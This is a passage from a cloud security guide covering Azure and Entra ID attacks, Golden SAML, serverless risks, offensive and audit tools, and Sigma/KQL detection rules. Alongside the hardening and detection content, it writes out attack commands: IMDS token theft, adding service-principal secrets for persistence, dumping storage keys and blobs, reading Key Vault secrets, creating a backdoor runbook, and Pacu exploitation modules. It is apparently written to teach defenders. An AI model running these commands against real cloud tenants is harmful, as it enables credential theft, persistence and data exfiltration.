gcloud org-policies set-policy --organization=ORG_ID <<'YAML'
constraint: constraints/compute.disableSerialPortAccess
booleanPolicy:
  enforced: true
YAML

# Require OS Login (centralized SSH access management)
gcloud org-policies set-policy --organization=ORG_ID <<'YAML'
constraint: constraints/compute.requireOsLogin
booleanPolicy:
  enforced: true
YAML

# Restrict VM external IPs
gcloud org-policies set-policy --organization=ORG_ID <<'YAML'
constraint: constraints/compute.vmExternalIpAccess
listPolicy:
  allValues: DENY
YAML
```

---

## 3. Azure security

### 3.1 Azure AD (Entra ID) and identity

**Tenant isolation.** Azure AD (now Entra ID) organizes identities into tenants. Guest users from other tenants can be invited; misconfigured guest permissions allow external users to enumerate directory objects.

**Service principals** are the Azure AD identity for applications. **Managed identities** (system-assigned: tied to a specific resource; user-assigned: created independently and attachable to multiple resources) provide automatic credential management via the IMDS identity endpoint.

**Azure IMDS.** `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/` returns an OAuth2 token for the managed identity. Same SSRF risk as AWS IMDSv1, but Azure's IMDS requires the `Metadata: true` header — a mild mitigation (some SSRF vectors can set custom headers).

**Exploitation — Azure IMDS token theft:**

```bash
# Retrieve managed identity token via SSRF or from compromised VM
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Token for Microsoft Graph API
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/"

# Use stolen token with az CLI
az login --identity  # from within the VM
az account show
az resource list  # enumerate accessible resources
```

#### 3.1.1 Entra ID attacks

**Application consent abuse.** An attacker registers a malicious multi-tenant application and requests broad API permissions (e.g., `Directory.ReadWrite.All`, `Mail.Read`). If a user (or admin) grants consent, the application gains persistent API access to the tenant's data. Illicit consent grants are a primary vector for BEC (business email compromise) via Graph API.

```bash
# Enumerate enterprise applications and their permissions
az ad app list --query '[].{Name:displayName,AppId:appId}' --output table
az ad sp list --query '[].{Name:displayName,AppId:appId}' --output table

# Check app permissions (delegated and application)
az ad app permission list --id <APP_ID>
```

**Service principal key abuse.** Application service principals can have multiple credential keys (secrets and certificates). An attacker who can add a credential to a service principal (`Application.ReadWrite.All` or `Owner` on the app registration) gains persistent access.

```bash
# Add a new secret to a service principal
az ad app credential reset --id <APP_ID> --append

# Authenticate as the service principal
az login --service-principal \
  --username <APP_ID> \
  --password <NEW_SECRET> \
  --tenant <TENANT_ID>
```

**Directory role escalation.** An attacker with `RoleManagement.ReadWrite.Directory` (or `Privileged Role Administrator`) can assign themselves Global Admin. Even without this, `Application Administrator` can add credentials to any app registration, which may have high-privilege service principals.

**Primary Refresh Token (PRT) theft.** The PRT is a long-lived credential used by Azure AD-joined devices for SSO. It is stored in the device's TPM (or in software if no TPM). Tools like `ROADtools` and `AADInternals` can extract PRTs from compromised devices and use them to bypass Conditional Access (the stolen PRT satisfies device-compliance and MFA requirements).

**Detection — Azure AD suspicious activity (KQL for Azure Monitor):**

```kql
// Detect new credentials added to service principals
AuditLogs
| where OperationName == "Add service principal credentials"
| where TimeGenerated > ago(7d)
| project TimeGenerated, InitiatedBy.user.userPrincipalName,
          TargetResources[0].displayName, Result

// Detect consent grants
AuditLogs
| where OperationName == "Consent to application"
| where TimeGenerated > ago(7d)
| project TimeGenerated, InitiatedBy.user.userPrincipalName,
          TargetResources[0].displayName,
          AdditionalDetails

// Detect role assignments
AuditLogs
| where OperationName has "Add member to role"
| where TargetResources[0].modifiedProperties[1].newValue has "Global Administrator"
| project TimeGenerated, InitiatedBy, TargetResources
```

**Hardening:**

```bash
# Require admin consent for all app permissions
az ad app update --id <APP_ID> --required-resource-accesses @permissions.json

# Block user consent entirely (Azure portal or PowerShell)
# Set "User consent for applications" to "Do not allow user consent"

# Enable admin consent workflow
# Azure Portal > Enterprise Applications > User Settings > Admin consent requests
```

### 3.2 Storage and Key Vault

**Shared Access Signatures (SAS).** SAS tokens grant time-limited, permission-scoped access to Azure Storage resources. A SAS with overly broad permissions or a long expiration is effectively a long-lived credential. `listKeys` permission on a storage account allows generating account-level SAS tokens.

**Key Vault.** Access is controlled by either vault access policies (legacy) or Azure RBAC (preferred). A principal with `key/get` and `secret/get` can read encryption keys and secrets. Soft-delete (deleted secrets are retained for a configurable period) and purge protection (deleted secrets cannot be permanently deleted for the retention period) prevent an attacker from destroying evidence.

**Exploitation — storage account key access:**

```bash
# List storage account keys (if listKeys permission is available)
az storage account keys list --account-name targetaccount --resource-group rg

# With the key, generate account-level SAS
az storage account generate-sas \
  --account-name targetaccount \
  --account-key <KEY> \
  --permissions rwdlacup \
  --services bfqt \
  --resource-types sco \
  --expiry 2026-12-31

# List all blobs in a container
az storage blob list --account-name targetaccount \
  --container-name secrets --account-key <KEY> --output table

# Download a blob
az storage blob download --account-name targetaccount \
  --container-name secrets --name credentials.json \
  --file ./exfil-creds.json --account-key <KEY>
```

**Key Vault exploitation:**

```bash
# List secrets in a Key Vault
az keyvault secret list --vault-name target-vault --output table

# Retrieve a secret value
az keyvault secret show --vault-name target-vault --name db-password

# List keys
az keyvault key list --vault-name target-vault
```

**Hardening — Azure Policy for storage accounts (ARM template):**

```json
{
  "if": {
    "allOf": [
      {"field": "type", "equals": "Microsoft.Storage/storageAccounts"},
      {"field": "Microsoft.Storage/storageAccounts/allowBlobPublicAccess", "equals": true}
    ]
  },
  "then": {
    "effect": "deny"
  }
}
```

### 3.3 Automation Account and ARM template abuse

**Automation Account Runbook abuse.** Azure Automation Accounts execute PowerShell/Python runbooks with Run As accounts (service principals) or managed identities. An attacker with `Contributor` on the Automation Account can create a runbook that executes arbitrary code with the Automation Account's identity — often a highly privileged service principal.

```bash
# List Automation Accounts
az automation account list --query '[].{Name:name,RG:resourceGroup}' --output table

# List runbooks in an Automation Account
az automation runbook list --automation-account-name target-auto \
  --resource-group rg --output table

# Create a malicious runbook
az automation runbook create \
  --automation-account-name target-auto \
  --resource-group rg \
  --name backdoor-runbook \
  --type PowerShell
```

**ARM template deployment history.** Azure Resource Manager records deployment history including template parameters. If templates were deployed with secrets as plaintext parameters (rather than using Key Vault references), those secrets persist in the deployment history.

```bash
# List deployments and inspect parameters
az deployment group list --resource-group rg --output table
az deployment group show --resource-group rg --name deploy-2025-01 \
  --query 'properties.parameters'
```

**Real-world — ChaosDB (2021).** Wiz researchers discovered that Azure Cosmos DB's Jupyter Notebook integration used a shared Cosmos DB account for all customers' notebooks. By exploiting the notebook container, they could access the primary keys of any Cosmos DB account. Microsoft patched this and rotated affected keys, but the vulnerability highlighted the risk of shared-infrastructure backends in managed services.

### 3.4 AKS and DevOps

**AKS.** The cluster's managed identity (used by the control plane to manage Azure resources) and the node pool's identity (used by kubelets to pull images, access storage) are distinct. The `azure.json` file mounted in every pod (for cloud-provider integration) historically contained the service principal's credentials — a credential-theft vector from any compromised pod. **Workload Identity** (AAD Pod Identity v2) replaces this with per-pod identity tokens.

**Azure DevOps pipeline injection.** If an attacker can modify a pipeline YAML file (via a compromised repository or a PR that the CI system auto-runs), they can inject steps that exfiltrate secrets, deploy backdoored code, or assume the pipeline's service connection identity. **PAT (Personal Access Token) scope** misconfigurations allow tokens with `Full Access` scope, granting the attacker the same permissions as the token owner.

**Detection — Azure DevOps and AKS abuse (KQL):**

```kql
// Detect AKS credential access
AzureActivity
| where OperationNameValue == "Microsoft.ContainerService/managedClusters/listClusterAdminCredential/action"
| project TimeGenerated, Caller, CallerIpAddress, ResourceGroup

// Detect secrets accessed from Key Vault
AzureDiagnostics
| where ResourceProvider == "MICROSOFT.KEYVAULT"
| where OperationName == "SecretGet"
| project TimeGenerated, CallerIPAddress, id_s, requestUri_s
```

### 3.5 Conditional Access and App Service

**Conditional Access bypass.** Conditional Access policies enforce MFA, device compliance, and location-based access. Bypass vectors: device-based CA can be circumvented by registering a compliant device with compromised credentials; MFA fatigue (repeatedly sending push notifications until the user approves — "MFA bombing") bypasses MFA-based CA; legacy authentication protocols (IMAP, SMTP, POP3) that don't support MFA bypass CA policies unless explicitly blocked.

**App Service SCM/KUDU.** Azure App Service deployments expose a `scm.azurewebsites.net` endpoint (the KUDU management interface) that provides deployment endpoints, debug console, process explorer, and environment variable access. If SCM authentication is misconfigured (e.g., `WEBSITE_AUTH_ENABLED` doesn't cover the SCM site), the attacker can access KUDU without authentication, read environment variables (including connection strings and secrets), and deploy malicious code.

**Azure Functions host key exposure.** Azure Functions use host keys for HTTP-triggered function authentication. These keys are stored in Azure Storage behind the Functions infrastructure. If the storage account is accessible, the keys can be retrieved directly, bypassing function-level authentication.

**Detection — Conditional Access bypass attempts (KQL):**

```kql
// Detect legacy protocol authentication attempts
SigninLogs
| where ClientAppUsed in ("Exchange ActiveSync", "IMAP4", "POP3", "SMTP", "Other clients")
| where ResultType == "0"  // Successful
| project TimeGenerated, UserPrincipalName, ClientAppUsed,
          IPAddress, Location, ConditionalAccessStatus

// Detect MFA fatigue — multiple MFA prompts in short window
SigninLogs
| where MfaDetail.authMethod == "PhoneAppNotification"
| summarize AttemptCount = count() by UserPrincipalName, bin(TimeGenerated, 10m)
| where AttemptCount > 5
```

**Hardening — block legacy authentication (Conditional Access):**

```bash
# Via Azure CLI — create a Conditional Access policy blocking legacy auth
# (typically done via Azure Portal or Graph API, as CLI support is limited)
# Azure Portal: Security > Conditional Access > New Policy
# Conditions > Client apps > "Exchange ActiveSync clients", "Other clients" = Selected
# Grant > Block access
```

---

## 4. Identity federation attacks

### 4.1 SAML and OIDC trust exploitation

Cloud providers allow federation with external identity providers via SAML 2.0 and OIDC. The trust relationship is: the cloud provider trusts assertions signed by the IdP's key. Compromise of the IdP's signing key = compromise of all federated accounts.

**Golden SAML.** An attacker who obtains the SAML signing certificate (from AD FS, Okta, or another IdP) can forge SAML assertions for any federated user. The forged assertion is accepted by the cloud provider because it's validly signed. This provides persistent, stealthy access — no password change, no MFA prompt, no login event at the IdP.

**AWS Golden SAML:**

```bash
# After obtaining the IdP signing certificate and key:
# 1. Craft a SAML assertion for a high-privilege user
# 2. Exchange it for AWS STS credentials
aws sts assume-role-with-saml \
  --role-arn arn:aws:iam::123456789012:role/FederatedAdmin \
  --principal-arn arn:aws:iam::123456789012:saml-provider/CompanyIdP \
  --saml-assertion file://forged-assertion.b64
```

**Azure Golden SAML:** Same concept — forged SAML assertion to Azure AD. The attacker authenticates as any user in the tenant without triggering IdP logs. Detection requires comparing Azure AD sign-in logs against IdP authentication logs to find sessions that exist in Azure AD but not in the IdP.

**OIDC token abuse.** AWS roles configured with `AssumeRoleWithWebIdentity` trust OIDC providers. If the trust policy doesn't restrict the `sub` (subject) claim, any identity from the OIDC provider can assume the role. CI/CD systems (GitHub Actions, GitLab CI) use OIDC federation — a misconfigured trust policy can allow any repository/workflow to assume the role.

**Hardening — restrict OIDC trust in AWS:**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
          "token.actions.githubusercontent.com:sub": "repo:company/repo:ref:refs/heads/main"
        }
      }
    }
  ]
}
```

**Detection — federated authentication anomalies:**

```sql
-- AWS CloudTrail Lake: detect SAML/OIDC role assumptions
SELECT eventTime, userIdentity.arn, sourceIPAddress,
       requestParameters.roleArn, requestParameters.principalArn
FROM <EVENT_DATA_STORE_ID>
WHERE eventName IN ('AssumeRoleWithSAML', 'AssumeRoleWithWebIdentity')
ORDER BY eventTime DESC
```

```kql
// Azure: detect SAML assertions without matching IdP log
SigninLogs
| where AuthenticationProtocol == "samlp"
| project TimeGenerated, UserPrincipalName, IPAddress,
          AuthenticationDetails, TokenIssuerName
```

**Real-world — SolarWinds (2020).** The SUNBURST attackers used Golden SAML to forge SAML tokens after compromising the AD FS signing certificate, enabling persistent access to Azure AD and Office 365 across multiple victim organizations. Microsoft's response included the development of detection tooling for anomalous SAML assertions.

---

## 5. Serverless security

### 5.1 Cross-provider serverless attack patterns

Serverless functions (AWS Lambda, Azure Functions, GCP Cloud Functions) share common attack surfaces despite platform differences.

**Dependency confusion in serverless packages.** Serverless deployments typically bundle dependencies. If the build process uses a public package registry (npm, PyPI) without pinning or using a private registry, dependency confusion attacks can inject malicious packages.

**Event source injection.** All serverless platforms trigger functions via events (HTTP, message queues, storage events, database streams). If the function trusts event data without validation, attackers can inject payloads through the event source. Examples: crafted S3 object key names, Pub/Sub message bodies, HTTP request parameters.

**Excessive execution role permissions.** Serverless functions often accumulate permissions over time. A function that only needs `dynamodb:GetItem` but has `dynamodb:*` (or worse, `*:*`) gives an attacker who exploits the function far more access than necessary.

**Cold start injection.** During a cold start, the function's runtime environment is initialized from the deployment package. An attacker who can modify the deployment package (via CI/CD compromise, layer/extension poisoning, or registry substitution) gets code execution on every cold start.

**Shared /tmp persistence (Lambda-specific).** Files in `/tmp` survive across warm invocations. Malicious code can write persistence payloads to `/tmp` that execute on subsequent invocations of the same function instance.

**Detection — serverless abuse patterns:**

```sql
-- AWS: detect Lambda functions invoked from unusual sources
SELECT eventTime, userIdentity.arn, requestParameters.functionName,
       sourceIPAddress
FROM <EVENT_DATA_STORE_ID>
WHERE eventSource = 'lambda.amazonaws.com'
AND eventName IN ('Invoke', 'InvokeAsync')
AND sourceIPAddress NOT IN ('lambda.amazonaws.com')
ORDER BY eventTime DESC
```

```kql
// Azure: detect Function App configuration changes
AzureActivity
| where OperationNameValue has "Microsoft.Web/sites"
| where OperationNameValue has "write" or OperationNameValue has "delete"
| project TimeGenerated, Caller, CallerIpAddress, OperationNameValue
```

**Hardening:** Pin dependencies with lockfiles and integrity hashes. Validate all event source data. Apply least-privilege execution roles (see Lambda section 1.4). Use runtime application self-protection (RASP) or function-level monitoring.

---

## 6. Multi-cloud tooling and assessment

### 6.1 Offensive and audit tools

| Tool | Scope | Purpose |
|------|-------|---------|
| **Pacu** | AWS | AWS exploitation framework. Modules for IAM privesc, credential harvesting, persistence, data exfiltration. |
| **ScoutSuite** | AWS, Azure, GCP | Multi-cloud security auditing. Generates HTML reports of misconfigurations across IAM, storage, compute, networking. |
| **Prowler** | AWS (primary), Azure, GCP | CIS benchmark checks, custom security checks, compliance frameworks (PCI-DSS, HIPAA, GDPR). |
| **CloudFox** | AWS, Azure, GCP | Enumerates attack paths in cloud environments. Finds overprivileged roles, exposed credentials, exploitable trust relationships. |
| **MicroBurst** | Azure | Azure-specific security assessment. Enumerates storage accounts, Key Vaults, Automation Accounts, network configs. |
| **ROADtools** | Azure AD | Azure AD enumeration and exploitation. Dumps directory objects, analyzes app permissions, maps attack paths. |
| **AADInternals** | Azure AD | Azure AD/Entra ID offensive toolkit. PRT theft, token manipulation, federation abuse, backdoor persistence. |
| **GCPBucketBrute** | GCP | Enumerate GCS buckets and test for public access. |

**Usage examples:**

```bash
# ScoutSuite — multi-cloud audit
scout aws --profile target-profile
scout azure --cli
scout gcp --project-id target-project

# Prowler — AWS CIS benchmark
prowler aws -p target-profile -M json-ocsf -o ./prowler-results
prowler aws --checks-file custom-checks.yaml

# CloudFox — enumerate attack paths
cloudfox aws --profile target-profile all-checks
cloudfox aws --profile target-profile iam-simulator
cloudfox aws --profile target-profile instances

# Pacu — AWS exploitation
pacu
> import_keys stolen
> run iam__enum_permissions
> run iam__privesc_scan
> run s3__download_bucket --bucket target-bucket
> run lambda__backdoor_new_roles
> run ebs__download_snapshots

# MicroBurst — Azure enumeration
Import-Module MicroBurst
Invoke-EnumerateAzureBlobs -Base company
Invoke-EnumerateAzureSubDomains -Base company
Get-AzPasswords  # Extract credentials from various Azure services

# ROADtools — Azure AD dump
roadrecon auth --device-code
roadrecon gather
roadrecon gui  # Launches web UI for AD exploration
```

### 6.2 Infrastructure-as-Code security scanning

Static analysis of IaC templates catches misconfigurations before deployment.

| Tool | Supported Formats |
|------|-------------------|
| **checkov** | Terraform, CloudFormation, ARM, Kubernetes, Helm, Dockerfile |
| **tfsec** (now part of Trivy) | Terraform |
| **KICS** | Terraform, CloudFormation, ARM, Ansible, Kubernetes, Docker, Helm |
| **terrascan** | Terraform, CloudFormation, Kubernetes |

```bash
# checkov — scan Terraform
checkov -d ./terraform/ --framework terraform --output json

# checkov — scan specific check IDs
checkov -d ./terraform/ --check CKV_AWS_18,CKV_AWS_19,CKV_AWS_21
# CKV_AWS_18: S3 bucket logging
# CKV_AWS_19: S3 bucket encryption
# CKV_AWS_21: S3 bucket versioning

# tfsec / trivy — scan Terraform
trivy config ./terraform/

# KICS — multi-format scan
kics scan -p ./infrastructure/ -o ./kics-results
```

### 6.3 Cloud-native CSPM

Cloud Security Posture Management (CSPM) continuously monitors cloud configurations.

- **AWS Security Hub** aggregates findings from GuardDuty, Inspector, Macie, IAM Access Analyzer, Firewall Manager, and third-party tools. Supports CIS AWS Foundations Benchmark and AWS Foundational Security Best Practices.
- **Azure Defender for Cloud** (formerly Azure Security Center) provides CSPM for Azure, AWS, and GCP. Secure Score quantifies posture.
- **GCP Security Command Center** (SCC) aggregates findings from Security Health Analytics, Web Security Scanner, Event Threat Detection, and Container Threat Detection.

Third-party CSPM (Wiz, Orca, Prisma Cloud, Lacework) typically provides richer cross-cloud correlation, attack-path analysis, and agentless workload scanning than native tools.

---

## 7. Cross-cloud patterns

Several attack patterns recur across all three providers:

**IMDS credential theft via SSRF.** AWS, GCP, and Azure all expose instance credentials via a link-local metadata service. SSRF in any application running on a cloud VM can reach the metadata service and steal credentials. Defense is provider-specific (IMDSv2, metadata concealment, header requirements) but the pattern is universal.

| Provider | Endpoint | Header Required | Mitigation |
|----------|----------|----------------|------------|
| AWS | `169.254.169.254/latest/meta-data/` | None (v1) / Token (v2) | IMDSv2, hop limit=1 |
| GCP | `metadata.google.internal/computeMetadata/v1/` | `Metadata-Flavor: Google` | Workload Identity, dedicated SA |
| Azure | `169.254.169.254/metadata/` | `Metadata: true` | NSG rules, managed identity scoping |

**Overprivileged service accounts.** A workload running with `Owner`/`AdministratorAccess`/`Contributor` instead of least-privilege permissions gives an attacker who compromises the workload full account/project/subscription access. The fix is the same everywhere: least-privilege IAM.

**Logging suppression.** Attackers disable or evade logging (CloudTrail, Cloud Audit Logs, Azure Activity Log) to hide their activity. Detection: alert on logging-configuration changes, use immutable logging destinations (S3 bucket with object lock, GCS with retention policy, Azure immutable storage).

**Lateral movement via network peering.** VPC peering (AWS), VPC network peering (GCP), and VNet peering (Azure) enable workloads in different networks to communicate. An attacker in one network can reach services in peered networks. Segmentation must account for peering topology.

**Cross-account/project/subscription trust abuse.** All three providers support resource sharing across trust boundaries (AWS cross-account roles, GCP cross-project service accounts, Azure cross-subscription RBAC). Attackers target the weakest link in the trust chain. Audit all cross-boundary trust relationships.

**Container and Kubernetes integration risks.** All three providers offer managed Kubernetes (EKS, GKE, AKS). The intersection of cloud IAM and Kubernetes RBAC creates escalation paths — node service accounts, pod identity misconfigurations, and RBAC misconfigurations are consistent across providers.

---

## 8. Cloud detection engineering

Cloud detection engineering differs from on-premises detection because the data sources are API audit logs rather than host-level telemetry. Every management-plane action in AWS, GCP, and Azure produces a structured log event (CloudTrail, Cloud Audit Logs, Azure Activity Log). Detection logic built on these logs can identify attacker techniques at the IAM, storage, networking, and logging layers before data-plane impact occurs. For serverless-specific detection patterns, see section 5 above.

### 8.1 Sigma rules for cloud events

Sigma provides a vendor-neutral detection format that compiles to CloudTrail Lake SQL, KQL for Azure Sentinel, and Chronicle YARA-L for GCP. The following rules cover high-value cloud attacker techniques.

**Rule 1 — IAM access key creation from unusual IP address.** When an attacker establishes persistence, creating a new access key for an existing IAM user is among the most common techniques. Detecting key creation from IP addresses outside the organization's known CIDR ranges flags both lateral movement and persistence attempts.

```yaml
title: AWS IAM Access Key Created From Unusual IP
id: 7a3e2c91-d4f8-4b1a-9c6e-3f5a8b2d1e04
status: experimental
description: >
  Detects creation of IAM access keys from IP addresses not belonging
  to known corporate or VPN CIDR ranges. Attackers with stolen credentials
  often create new access keys for persistence.
logsource:
  product: aws
  service: cloudtrail
detection:
  selection:
    eventName: CreateAccessKey
    eventSource: iam.amazonaws.com
  filter_known_ips:
    sourceIPAddress|cidr:
      - '10.0.0.0/8'
      - '172.16.0.0/12'
      - '192.168.0.0/16'
      # Add corporate public CIDR ranges here
  condition: selection and not filter_known_ips
falsepositives:
  - Administrators working from personal networks
  - Automated CI/CD pipelines with dynamic IP ranges
level: high
tags:
  - attack.persistence
  - attack.t1098.001
```

**Rule 2 — S3 bucket policy changed to public access.** Public S3 bucket exposure is among the most damaging cloud misconfigurations. Detecting bucket policy modifications that introduce public access (`"Principal": "*"`) catches both accidental misconfiguration and deliberate data exfiltration staging.

```yaml
title: AWS S3 Bucket Policy Changed To Allow Public Access
id: 8b4f1d72-e5a9-4c2b-ad3f-6e7c9a1b5d83
status: experimental
description: >
  Detects PutBucketPolicy events where the new policy contains a
  wildcard principal, indicating public access. Also detects removal
  of public access block configurations.
logsource:
  product: aws
  service: cloudtrail
detection:
  selection_policy:
    eventName: PutBucketPolicy
    eventSource: s3.amazonaws.com
    requestParameters|contains: '"Principal":"*"'
  selection_public_block:
    eventName: PutPublicAccessBlock
    eventSource: s3.amazonaws.com
  selection_delete_block:
    eventName: DeletePublicAccessBlock
    eventSource: s3.amazonaws.com
  condition: selection_policy or selection_delete_block or selection_public_block
falsepositives:
  - Intentional public bucket creation for static website hosting
level: critical
tags:
  - attack.exfiltration
  - attack.t1537
```

**Rule 3 — Azure AD Conditional Access policy modification.** Conditional Access policies are the primary enforcement mechanism for Azure AD authentication posture. Modifying or disabling a Conditional Access policy weakens MFA enforcement, device compliance requirements, or location-based restrictions, enabling credential-based attacks.

```yaml
title: Azure AD Conditional Access Policy Modified Or Deleted
id: 9c5e2a63-f7b1-4d8c-be4a-7f8d0c3e6a15
status: experimental
description: >
  Detects modifications or deletions of Conditional Access policies
  in Azure AD / Entra ID. Attackers disable CA policies to reduce
  authentication requirements after gaining initial access.
logsource:
  product: azure
  service: auditlogs
detection:
  selection:
    operationName:
      - 'Update conditional access policy'
      - 'Delete conditional access policy'
    category: Policy
  condition: selection
falsepositives:
  - Legitimate policy updates by identity administrators
  - Policy migration during tenant consolidation
level: high
tags:
  - attack.defense_evasion
  - attack.t1562.001
```

**Rule 4 — GCP service account key export.** GCP service account keys are long-lived credentials that do not rotate automatically. Exporting (creating) a service account key provides an attacker with persistent access that survives password resets and session revocations. Organizations that enforce Workload Identity Federation should have zero legitimate key-creation events.

```yaml
title: GCP Service Account Key Created
id: a1d73b84-c6e2-4f9a-8b5d-2e4f1a7c9d06
status: experimental
description: >
  Detects creation of service account keys in GCP. In environments
  using Workload Identity Federation, any key creation is anomalous
  and may indicate credential persistence by an attacker.
logsource:
  product: gcp
  service: gcp.audit
detection:
  selection:
    methodName: google.iam.admin.v1.CreateServiceAccountKey
  condition: selection
falsepositives:
  - Legacy applications requiring key-based authentication
  - Initial setup of external integrations before Workload Identity migration
level: high
tags:
  - attack.persistence
  - attack.t1098.001
```

**Rule 5 — Cross-account AssumeRole from unknown principal.** AWS cross-account role assumption is expected between trusted accounts. When an `AssumeRole` call originates from an account ID not in the organization's trusted-accounts list, it indicates either a misconfigured trust policy or an attacker using a compromised trust relationship.

```yaml
title: AWS AssumeRole From Unknown External Account
id: b2e84c95-d7f3-4a1b-9c6e-3f5a2b8d7e19
status: experimental
description: >
  Detects sts:AssumeRole calls where the source account is not in the
  known-trusted-accounts list. Flags potential confused deputy or
  trust policy abuse from external AWS accounts.
logsource:
  product: aws
  service: cloudtrail
detection:
  selection:
    eventName: AssumeRole
    eventSource: sts.amazonaws.com
  filter_internal:
    userIdentity.accountId:
      - '111111111111'
      - '222222222222'
      # Add all organization account IDs
  filter_aws_services:
    userIdentity.invokedBy|contains: '.amazonaws.com'
  condition: selection and not filter_internal and not filter_aws_services
falsepositives:
  - Newly onboarded partner accounts not yet added to the allowlist
  - AWS service-linked role assumptions from new services
level: high
tags:
  - attack.lateral_movement
  - attack.t1550.001
```

**Rule 6 — CloudTrail, Activity Log, or Cloud Audit logging disabled.** Disabling audit logging is a prerequisite for stealthy post-exploitation. Detecting logging-configuration changes is one of the highest-confidence indicators of compromise because legitimate administrators rarely disable audit trails during normal operations.

```yaml
title: Cloud Audit Logging Disabled (AWS, Azure, GCP)
id: c3f95da6-e8a4-4b2c-ad7f-4a6b3c9e8f21
status: experimental
description: >
  Detects events that disable or degrade audit logging across AWS,
  Azure, and GCP. Covers CloudTrail StopLogging and DeleteTrail,
  Azure diagnostic settings deletion, and GCP audit config changes.
logsource:
  product: aws
  service: cloudtrail
detection:
  selection_aws:
    eventName:
      - StopLogging
      - DeleteTrail
      - UpdateTrail
    eventSource: cloudtrail.amazonaws.com
  condition: selection_aws
falsepositives:
  - Trail consolidation during account restructuring
  - Trail reconfiguration (UpdateTrail) for legitimate tuning
level: critical
tags:
  - attack.defense_evasion
  - attack.t1562.008
```

The Azure and GCP equivalents use their respective log sources:

```yaml
# Azure variant (separate rule deployment)
title: Azure Diagnostic Settings Deleted
id: c3f95da6-e8a4-4b2c-ad7f-4a6b3c9e8f22
status: experimental
description: Detects deletion of Azure diagnostic settings that forward logs to a SIEM.
logsource:
  product: azure
  service: activitylogs
detection:
  selection:
    operationName: MICROSOFT.INSIGHTS/DIAGNOSTICSETTINGS/DELETE
  condition: selection
falsepositives:
  - Resource group cleanup during decommissioning
level: critical
tags:
  - attack.defense_evasion
  - attack.t1562.008
```

```yaml
# GCP variant
title: GCP Audit Log Sink Deleted
id: c3f95da6-e8a4-4b2c-ad7f-4a6b3c9e8f23
status: experimental
description: Detects deletion of GCP audit log sinks, reducing log visibility.
logsource:
  product: gcp
  service: gcp.audit
detection:
  selection:
    methodName: google.logging.v2.ConfigServiceV2.DeleteSink
  condition: selection
falsepositives:
  - Sink migration to a new destination bucket
level: critical
tags:
  - attack.defense_evasion
  - attack.t1562.008
```

**Rule 7 — API calls from unusual regions.** Cloud environments typically operate within a defined set of regions. API calls from regions where the organization has no infrastructure indicate either credential theft (attacker operating from their own region) or an attempt to create resources in unmonitored regions to evade detection.

```yaml
title: AWS API Call From Unusual Region
id: d4a06eb7-f9b5-4c3d-be8a-5b7c4d0f9a32
status: experimental
description: >
  Detects AWS API calls originating from regions not in the
  organization's approved region list. Attackers often operate
  from different regions to avoid geo-based detection.
logsource:
  product: aws
  service: cloudtrail
detection:
  selection:
    eventType: AwsApiCall
  filter_approved_regions:
    awsRegion:
      - us-east-1
      - us-west-2
      - eu-west-1
      # Add organization's approved regions
  filter_global:
    awsRegion: us-east-1
    eventSource:
      - iam.amazonaws.com
      - sts.amazonaws.com
      - organizations.amazonaws.com
  condition: selection and not filter_approved_regions and not filter_global
falsepositives:
  - Disaster recovery testing in alternate regions
  - New region deployment not yet added to the allowlist
level: medium
tags:
  - attack.defense_evasion
  - attack.t1535
```

### 8.2 Cloud-native alerting configurations

Each provider offers native alerting that operates without external SIEM infrastructure. These alerts serve as a first line of detection for organizations that have not yet deployed centralized log analysis.

**AWS CloudWatch alarms and EventBridge rules.** CloudWatch Metric Filters parse CloudTrail logs delivered to a CloudWatch Log Group and increment a custom metric when a pattern matches. EventBridge rules match CloudTrail events in near-real-time and route them to SNS, Lambda, or Step Functions for notification and automated response.

```bash
# Create a CloudWatch Metric Filter for IAM access key creation
aws logs put-metric-filter \
  --log-group-name CloudTrail/ManagementEvents \
  --filter-name IAMAccessKeyCreated \
  --filter-pattern '{ ($.eventName = "CreateAccessKey") }' \
  --metric-transformations \
    metricName=IAMAccessKeyCreationCount,metricNamespace=CloudSecurity,metricValue=1

# Create CloudWatch alarm on the metric
aws cloudwatch put-metric-alarm \
  --alarm-name IAMAccessKeyCreationAlarm \
  --metric-name IAMAccessKeyCreationCount \
  --namespace CloudSecurity \
  --statistic Sum \
  --period 300 \
  --threshold 1 \
  --comparison-operator GreaterThanOrEqualToThreshold \
  --evaluation-periods 1 \
  --alarm-actions arn:aws:sns:us-east-1:123456789012:SecurityAlerts

# EventBridge rule for CloudTrail StopLogging
aws events put-rule \
  --name DetectCloudTrailDisable \
  --event-pattern '{
    "source": ["aws.cloudtrail"],
    "detail-type": ["AWS API Call via CloudTrail"],
    "detail": {
      "eventName": ["StopLogging", "DeleteTrail"]
    }
  }'

aws events put-targets \
  --rule DetectCloudTrailDisable \
  --targets "Id"="1","Arn"="arn:aws:sns:us-east-1:123456789012:SecurityAlerts"
```

**Azure Monitor alert rules.** Azure Monitor queries the Log Analytics workspace (where Activity Logs and Azure AD sign-in logs are sent) using KQL. Alert rules evaluate KQL queries on a schedule and fire when results exceed a threshold.

```bash
# Create an Azure Monitor scheduled query alert for CA policy changes
az monitor scheduled-query create \
  --name "ConditionalAccessPolicyChange" \
  --resource-group SecurityRG \
  --scopes "/subscriptions/<sub-id>/resourceGroups/SecurityRG/providers/Microsoft.OperationalInsights/workspaces/SecurityWorkspace" \
  --condition "count 'AuditLogs | where OperationName has \"conditional access policy\" | where Result == \"success\"' > 0" \
  --window-size 5m \
  --evaluation-frequency 5m \
  --severity 2 \
  --action-groups "/subscriptions/<sub-id>/resourceGroups/SecurityRG/providers/Microsoft.Insights/actionGroups/SecurityTeam"
```

**GCP Cloud Monitoring alert policies.** GCP routes Admin Activity audit logs to Cloud Logging by default (these cannot be disabled). Alert policies query log-based metrics and trigger notifications via Pub/Sub, email, or PagerDuty.

```bash
# Create a log-based metric for service account key creation
gcloud logging metrics create sa-key-creation \
  --description="Detects service account key creation events" \
  --log-filter='protoPayload.methodName="google.iam.admin.v1.CreateServiceAccountKey"'

